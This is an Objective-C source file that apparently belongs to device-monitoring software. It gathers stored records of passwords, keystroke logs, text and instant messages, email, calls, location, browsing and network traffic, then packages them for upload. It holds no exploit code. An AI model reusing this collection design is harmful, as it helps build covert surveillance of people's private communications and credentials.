//
//  RegularEventDataProvider.m
//  EDM
//
//  Created by Makara Khloth on 10/20/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "RegularEventDataProvider.h"
#import "ProtocolEventConverter.h"

#import "SendEvent.h"

#import "EventResultSet.h"
#import "QueryCriteria.h"

#import "DefDDM.h"

@implementation RegularEventDataProvider

- (id) initWithEventRepository: (id <EventRepository>) aEventRepository andEventKeysDatabase: (EventKeysDatabase*) aDatabase {
	if ((self = [super initWithEventKeysDatabase:aDatabase])) {
		mEventRepository = aEventRepository;
		[mEventRepository retain];
	}
	return (self);
}

- (id) commandData {
	// Select events
	QueryCriteria* queryCriteria = [[QueryCriteria alloc] init];
	[queryCriteria setMMaxEvent:50];
	[queryCriteria setMQueryOrder:kQueryOrderOldestFirst];
	[queryCriteria addQueryEventType:kEventTypeCallLog];
    [queryCriteria addQueryEventType:kEventTypePassword];
	[queryCriteria addQueryEventType:kEventTypeVoIP];
	[queryCriteria addQueryEventType:kEventTypeKeyLog];
    [queryCriteria addQueryEventType:kEventTypePageVisited];
	[queryCriteria addQueryEventType:kEventTypeSms];
	[queryCriteria addQueryEventType:kEventTypeIM];
	[queryCriteria addQueryEventType:kEventTypeIMAccount];
	[queryCriteria addQueryEventType:kEventTypeIMContact];
	[queryCriteria addQueryEventType:kEventTypeIMConversation];
	[queryCriteria addQueryEventType:kEventTypeIMMessage];
	[queryCriteria addQueryEventType:kEventTypeMms];
	[queryCriteria addQueryEventType:kEventTypeMail];
	[queryCriteria addQueryEventType:kEventTypeLocation];
	[queryCriteria addQueryEventType:kEventTypeBrowserURL];
	[queryCriteria addQueryEventType:kEventTypeBookmark];
	[queryCriteria addQueryEventType:kEventTypeApplicationLifeCycle];
    [queryCriteria addQueryEventType:kEventTypeLogon];
    [queryCriteria addQueryEventType:kEventTypeUsbConnection];
    [queryCriteria addQueryEventType:kEventTypeFileTransfer];
    [queryCriteria addQueryEventType:kEventTypeAppUsage];
    [queryCriteria addQueryEventType:kEventTypeEmailMacOS];
    [queryCriteria addQueryEventType:kEventTypeFileActivity];
    [queryCriteria addQueryEventType:kEventTypeNetworkTraffic];
    [queryCriteria addQueryEventType:kEventTypeNetworkConnectionMacOS];
    
	mEventResultSet = [mEventRepository regularEvents:queryCriteria];
	[mEventResultSet retain];
	[queryCriteria release];
	mEventIndex = 0;
	mEventCount = [[mEventResultSet mEventArray] count];
	SendEvent* sendEvent = [[SendEvent alloc] init];
	[sendEvent setEventCount:(unsigned int)mEventCount];
	[sendEvent setEventProvider:self];
	[sendEvent autorelease];
	return (sendEvent);
}

- (id)getObject {
	id event = [ProtocolEventConverter convertToPhoenixProtocolEvent:[[mEventResultSet mEventArray] objectAtIndex:mEventIndex] fromThumbnail:FALSE];
	mEventIndex++;
	return (event);
}

- (BOOL)hasNext {
	BOOL hasNext = (mEventIndex < mEventCount);
	if (!hasNext) {
		EventKeys* eventKeys = [mEventResultSet shrink];
		[mEventResultSet release];
		mEventResultSet = nil;
		@try {
			[self insertEventKeys:eventKeys andEDPType:kEDPTypeAllRegular];
		}
		@catch (NSException * e) {
			
		}
		@finally {
			
		}
	}
	return (hasNext);
}

- (void) dealloc {
	[mEventResultSet release];
	[mEventRepository release];
	[super dealloc];
}

@end
